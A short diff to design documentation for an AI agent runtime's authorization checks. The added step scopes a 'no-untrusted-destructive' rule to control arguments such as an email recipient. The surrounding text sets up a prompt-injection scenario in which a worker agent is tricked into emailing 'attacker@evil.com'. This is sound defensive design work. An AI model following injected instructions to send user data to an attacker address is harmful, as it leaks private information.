@@ -96,7 +96,8 @@ At dispatch time:
 1. The runtime canonicalizes the authorized recipient back to the live value. The strongest path is `{ "handle": "h_a7x9k2" }`, but the exact emitted preview or bare visible value also resolves when the match is unique.
 2. The authorization guard checks: is `sendEmail` allowed? Is `recipient` the pinned value? Yes
 3. The inherited positive check runs: does `recipient` carry fact proof or `known`? Yes
-4. The call proceeds
+4. `no-untrusted-destructive` scopes to control args — `recipient` has `untrusted` cleared by trust refinement. Tainted data args (subject, body) are not checked.
+5. The call proceeds
 
 If injection tricks the worker into calling `sendEmail(recipient: "attacker@evil.com")`:
 
